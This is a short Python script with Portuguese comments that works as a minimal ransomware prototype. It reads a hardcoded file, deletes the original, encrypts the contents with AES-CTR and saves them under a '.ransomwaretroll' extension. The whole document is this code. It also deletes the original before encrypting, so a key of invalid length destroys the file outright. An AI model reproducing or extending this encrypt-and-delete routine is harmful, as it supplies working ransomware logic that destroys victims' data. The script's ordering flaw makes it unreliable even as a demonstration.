import os
import pyaes
from getpass import getpass

# Função para obter a chave de criptografia de maneira segura
def get_encryption_key():
    key = os.getenv('ENCRYPTION_KEY')  # Tenta obter a chave de uma variável de ambiente
    if key is None:
        # Se não encontrar na variável de ambiente, pede ao usuário
        key = getpass("Digite a chave de criptografia: ")
    return key.encode()  # Certifique-se de que a chave esteja no formato byte

# Função para criptografar um arquivo
def encrypt_file(file_name, encryption_key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)

        # Inicializar a criptografia AES no modo CTR com a chave fornecida
        aes = pyaes.AESModeOfOperationCTR(encryption_key)

        # Criptografar os dados
        encrypted_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        new_file_name = f"{file_name}.ransomwaretroll"  # Adiciona a extensão '.ransomwaretroll'
        with open(new_file_name, "wb") as new_file:
            new_file.write(encrypted_data)

        print(f"Arquivo criptografado com sucesso! Arquivo salvo como: {new_file_name}")

    except FileNotFoundError:
        print(f"Erro: O arquivo {file_name} não foi encontrado.")
    except Exception as e:
        print(f"Ocorreu um erro durante a criptografia: {e}")

# Função principal
def main():
    # Nome do arquivo a ser criptografado
    file_name = "teste.txt"

    # Obter chave de criptografia
    encryption_key = get_encryption_key()

    # Criptografar o arquivo
    encrypt_file(file_name, encryption_key)

if __name__ == "__main__":
    main()
